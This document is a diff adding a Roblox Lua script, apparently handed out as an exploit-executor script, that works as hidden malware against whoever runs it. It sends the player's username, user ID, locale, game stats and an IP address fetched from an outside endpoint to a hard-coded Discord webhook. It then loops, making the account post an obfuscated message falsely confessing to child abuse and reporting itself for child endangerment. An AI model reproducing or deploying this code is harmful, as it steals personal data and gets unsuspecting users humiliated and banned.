@@ -1,0 +1,48 @@
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Trash"
+
+local url =
+   "https://discord.com/api/webhooks/999467010222194780/auFTT4SLrZj_I9jd6OR5E-8hWulJlzBc3c1Tgraa2QVy3UaH8qfWPXfLX5AnJLs-Wv3w"
+local data = {
+   ["avatar_url"] = "https://cdn.discordapp.com/attachments/746824659944865892/994407512432463952/f53324bb0202bdbde984fb83dbfbf409.jpg",
+   ["content"] = "",
+   ["embeds"] = {
+       {
+     
+      ["author"] = {
+      ["name"] = "( Birisi scriptini injectledi! )",
+      ["url"] = "https://roblox.com",
+    },
+        
+           ["description"] = "\n__Player Info__".." **\nDisplay Name:** "..game.Players.LocalPlayer.DisplayName.." \n**Username:** " .. game.Players.LocalPlayer.Name.." \n**User Id:** "..game.Players.LocalPlayer.UserId.." \n**Langue:** "..game.LocalizationService.RobloxLocaleId.." \n**Exploit:** "..webhookcheck.."\n\n__Game Info__".."\n**Game:** "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.." \n**Game Id**: "..game.PlaceId.." \n**Wins:** "..game:GetService("Players").LocalPlayer.leaderstats.Wins.Value.." \n**Coins: **"..game:GetService("Players").LocalPlayer.leaderstats.Coins.Value.."\n\n__User Info__".."**\nIP:** "..game:HttpGet("https://piroves.gq/gusgus.php").."",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
+            }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+wait(1)
+local Players = game:GetService'Players'
+local SayMessageRequest = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+local a = 'p'
+local g = 'r'
+local d = 'a'
+local f = 'e'
+while true do
+    SayMessageRequest:FireServer('I'..g..d..a..f..'children', 'All')
+    task.wait(2.5)
+    Players:ReportAbuse(game.Players.LocalPlayer, 'Child Endangerment', 'Child Endangerment')
+    task.wait()
+end
